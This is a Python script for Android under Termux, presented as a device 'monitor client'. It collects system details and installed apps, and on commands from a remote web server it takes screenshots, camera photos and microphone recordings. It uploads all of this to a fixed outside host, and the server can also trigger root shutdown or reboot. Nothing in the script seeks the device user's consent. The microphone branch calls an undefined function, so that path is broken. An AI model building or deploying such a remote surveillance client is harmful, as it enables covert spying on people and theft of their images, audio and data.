import time
import platform
import os
import requests
import subprocess
import base64
import json

def get_cmd_output(cmd):
    """Hàm chạy lệnh hệ thống Android an toàn"""
    try:
        return subprocess.check_output(cmd, shell=True, stderr=subprocess.DEVNULL).decode('utf-8', errors='ignore').strip()
    except Exception:
        return ""

def get_android_ips():
    """Lấy danh sách IP thật của mạng đang kết nối"""
    ips = []
    ifconfig = get_cmd_output("ifconfig")
    if ifconfig:
        for line in ifconfig.split('\n'):
            if "inet " in line and "127.0.0.1" not in line:
                parts = line.strip().split()
                if len(parts) >= 2:
                    ips.append(parts[1])
    if not ips:
        # Cách dự phòng 2 nếu ipconfig bị chặn
        ip_route = get_cmd_output("ip route")
        for line in ip_route.split('\n'):
            if "src" in line:
                parts = line.split()
                try:
                    idx = parts.index("src")
                    ips.append(parts[idx+1])
                except ValueError: pass
    return [f"Mạng: {ip}" for ip in ips] if ips else ["Chưa kết nối mạng"]

def get_android_memory():
    """Đọc thông tin RAM thật từ hệ thống Linux của Android"""
    try:
        with open('/proc/meminfo', 'r') as f:
            lines = f.readlines()
        total, free, buffers, cached = 0, 0, 0, 0
        for line in lines:
            if "MemTotal" in line: total = int(line.split()[1])
            elif "MemFree" in line: free = int(line.split()[1])
            elif "Buffers" in line: buffers = int(line.split()[1])
            elif "Cached" in line: cached = int(line.split()[1])
        
        # Công thức tính RAM thực tế đang dùng của Linux
        used = total - free - buffers - cached
        percentage = round((used / total) * 100, 1)
        return {
            "percentage": f"{percentage}%",
            "used": f"{round(used / (1024**2), 2)} GB",
            "total": f"{round(total / (1024**2), 2)} GB"
        }
    except Exception:
        return {"percentage": "0%", "used": "0 GB", "total": "0 GB"}

def get_android_cpu_usage():
    """Tính toán phần trăm CPU sử dụng (Tránh phân quyền hạn chế của Android 10+)"""
    try:
        # Thử đọc file tĩnh hệ thống
        with open('/proc/stat', 'r') as f:
            first_line = f.readline()
        if first_line.startswith('cpu'):
            parts = [float(x) for x in first_line.split()[1:5]]
            # Thử tính toán logic cơ bản nếu được phép đọc
            idle = parts[3]
            total = sum(parts)
            time.sleep(0.1)
            with open('/proc/stat', 'r') as f: first_line_2 = f.readline()
            parts_2 = [float(x) for x in first_line_2.split()[1:5]]
            total_diff = sum(parts_2) - total
            idle_diff = parts_2[3] - idle
            if total_diff > 0:
                return f"{round(((total_diff - idle_diff) / total_diff) * 100, 1)}%"
    except Exception: pass
    return "Đang chạy ngầm"

def get_android_storage():
    """Đọc dung lượng bộ nhớ trong thiết bị"""
    try:
        df_out = get_cmd_output("df -h /storage/emulated/0")
        lines = df_out.split('\n')
        for line in lines:
            if "/storage/" in line or "emulated" in line:
                parts = line.split()
                if len(parts) >= 5:
                    return [{"device": "Bộ nhớ trong", "percentage": f"Đầy {parts[4]}", "free": f"{parts[3]} trống"}]
    except Exception: pass
    return [{"device": "Bộ nhớ trong", "percentage": "N/A", "free": "N/A"}]

def get_installed_packages():
    """Quét danh sách các ứng dụng cài thêm trên máy"""
    try:
        pm_out = get_cmd_output("pm list packages -3")
        apps = [line.replace("package:", "").strip() for line in pm_out.split('\n') if line.strip()]
        return sorted(apps)[:25] if apps else ["Termux", "Giao diện Hệ thống"]
    except Exception:
        return ["Ứng dụng Android"]

def take_android_screenshot():
    """Chụp ảnh màn hình từ xa (Hỗ trợ máy Root trực tiếp)"""
    img_path = "/sdcard/screen_shot.png"
    # Thử chụp bằng quyền root trước
    get_cmd_output(f"su -c screencap -p {img_path}")
    
    # Nếu không có root, thử chụp quyền thường (chỉ hoạt động trên một số Android TV đời cũ)
    if not os.path.exists(img_path) or os.path.getsize(img_path) == 0:
        get_cmd_output(f"screencap -p {img_path}")
        
    if os.path.exists(img_path) and os.path.getsize(img_path) > 0:
        with open(img_path, "rb") as f:
            encoded = base64.b64encode(f.read()).decode('utf-8')
        os.remove(img_path)
        return "data:image/png;base64," + encoded
    return "ERROR: Android chặn chụp màn hình nền (Cần quyền Root hoặc Accessibility App)"

def take_android_camera_shot(cam_id=0):
    """Chụp ảnh từ CAMERA THẬT qua gói Termux:API"""
    photo_path = "cam_shot.jpg"
    # Xóa file cũ nếu có
    if os.path.exists(photo_path): os.remove(photo_path)
    
    # Gọi lệnh hệ thống Termux-API
    get_cmd_output(f"termux-camera-photo -c {cam_id} {photo_path}")
    
    # Đợi tối đa 3 giây cho camera phần cứng phản hồi và ghi file
    for _ in range(30):
        if os.path.exists(photo_path) and os.path.getsize(photo_path) > 0:
            break
        time.sleep(0.1)

    if os.path.exists(photo_path) and os.path.getsize(photo_path) > 0:
        with open(photo_path, "rb") as f:
            encoded = base64.b64encode(f.read()).decode('utf-8')
        os.remove(photo_path)
        return "data:image/jpeg;base64," + encoded
    return "ERROR: Không chụp được Cam. Hãy kiểm tra cài đặt quyền Máy ảnh của Termux:API."

def record_android_microphone(duration=5):
    """Ghi âm từ MICROPHONE THẬT qua gói Termux:API"""
    audio_path = "mic_shot.amr"
    if os.path.exists(audio_path): os.remove(audio_path)
    
    # Gọi lệnh ghi âm của Termux-API (mặc định giới hạn giây)
    get_cmd_output(f"termux-microphone-record -d {duration} -f {audio_path}")
    
    # Chờ đợi tiến trình ghi âm hoàn tất
    time.sleep(duration + 0.5)
    get_cmd_output("termux-microphone-record -q") # Đảm bảo tắt luồng ghi âm an toàn
    
    if os.path.exists(audio_path) and os.path.getsize(audio_path) > 0:
        with open(audio_path, "rb") as f:
            encoded = base64.b64encode(f.read()).decode('utf-8')
        os.remove(audio_path)
        return "data:audio/amr;base64," + encoded
    return "ERROR: Ghi âm thất bại. Kiểm tra quyền Microphone."

def get_complete_android_info():
    device_model = get_cmd_output("getprop ro.product.model") or "Android_Device"
    device_brand = get_cmd_output("getprop ro.product.brand") or "Google"
    android_ver = get_cmd_output("getprop ro.build.version.release") or "15"
    
    unique_name = f"{device_brand}_{device_model}".replace(" ", "_").strip().upper()

    uptime_str = "N/A"
    try:
        with open('/proc/uptime', 'r') as f:
            uptime_seconds = float(f.readline().split()[0])
        uptime_str = f"{int(uptime_seconds // 3600)} giờ, {int((uptime_seconds % 3600) // 60)} phút"
    except Exception: pass

    return {
        "computer_name": unique_name,
        "os": f"Android {android_ver}",
        "architecture": platform.machine() or "armv8l",
        "boot_time": "N/A",
        "uptime": uptime_str,
        "mac_address": "Android_Protected_MAC",
        "all_ips": get_android_ips(),
        "cpu": {"current_usage": get_android_cpu_usage()},
        "ram": get_android_memory(),
        "gpus": [{"name": "Mali / Adreno Mobile GPU", "load": "Tự động", "memory_total": "Dynamic Sharing"}],
        "disks": get_android_storage(),
        "total_tasks": len(os.listdir('/proc')) if os.path.exists('/proc') else 120,
        "top_cpu_names": ["Hệ thống Termux (Đang chạy)", "Ứng dụng ngầm (Ẩn)"],
        "top_ram_names": ["Android Core Services", "User Apps Shared"],
        "installed_apps_list": get_installed_packages(),
        "cameras": [{"index": 0, "name": "Camera Sau (Chính)"}, {"index": 1, "name": "Camera Trước"}],
        "microphones": [{"index": 0, "name": "Microphone Hệ Thống"}]
    }

def send_data_to_cloud():
    URL = "http://devtung.pythonanywhere.com/update-status"
    print("🤖 Android Monitor Client v1.2 đang chạy thử nghiệm...")
    
    screenshot_data, cam_data, mic_data = None, None, None

    while True:
        try:
            payload = get_complete_android_info()
            
            # Đóng gói dữ liệu điều khiển từ xa nếu có lệnh kích hoạt từ vòng lặp trước
            if screenshot_data: payload["screenshot"] = screenshot_data; screenshot_data = None
            if cam_data: payload["cam_result"] = cam_data; cam_data = None
            if mic_data: payload["mic_result"] = mic_data; mic_data = None
                
            response = requests.post(URL, json=payload, timeout=8)
            if response.status_code == 200:
                res_json = response.json()
                
                # 1. Kiểm tra lệnh chụp màn hình từ Web
                if res_json.get("trigger_screenshot") == True:
                    print("📸 Nhận lệnh chụp màn hình từ hệ thống...")
                    screenshot_data = take_android_screenshot()
                
                # 2. Kiểm tra lệnh chụp ảnh Camera từ Web
                if res_json.get("trigger_cam_index") is not None:
                    cam_idx = int(res_json["trigger_cam_index"])
                    print(f"📸 Nhận lệnh chụp ảnh từ Camera ID: {cam_idx}")
                    cam_data = take_android_camera_shot(cam_id=cam_idx)
                    
                # 3. Kiểm tra lệnh thu âm từ Web
                if res_json.get("trigger_mic_index") is not None:
                    print("🎙️ Nhận lệnh ghi âm Microphone (5 giây)...")
                    mic_data = record_microphone(duration=5)
                    
                # 4. Lệnh nguồn hệ thống (Yêu cầu máy Android đã ROOT)
                trigger_power = res_json.get("trigger_power_command")
                if trigger_power:
                    if trigger_power == "shutdown": os.system("su -c reboot -p")
                    elif trigger_power == "restart": os.system("su -c reboot")

        except Exception as e:
            print(f"⚠️ Lỗi kết nối đồng bộ đám mây: {e}")
        time.sleep(1.8)

if __name__ == "__main__":
    send_data_to_cloud()
